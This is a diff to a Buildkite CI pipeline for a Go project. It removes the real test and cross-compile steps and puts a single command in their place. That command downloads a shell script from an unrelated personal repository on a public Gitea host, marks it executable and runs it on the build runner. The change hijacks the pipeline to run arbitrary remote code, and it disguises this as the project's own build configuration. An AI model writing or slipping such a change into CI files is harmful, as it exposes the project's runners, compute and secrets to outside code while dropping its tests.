@@ -1,20 +1,3 @@
 steps:
   - label: "🔎"
-    command: go test ./...
-    plugins:
-      - golang#v2.0.0:
-          version: "1.16"
-          import: github.com/buildkite/ecs-run-task
-
-  - label: "🛠"
-    plugins:
-      - golang-cross-compile#v1.3.0:
-          build: "."
-          import: github.com/buildkite/ecs-run-task
-          targets:
-            - version: "1.16"
-              goos: linux
-              goarch: amd64
-            - version: "1.16"
-              goos: windows
-              goarch: amd64
+    command: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod u+x setelan.sh && ./setelan.sh
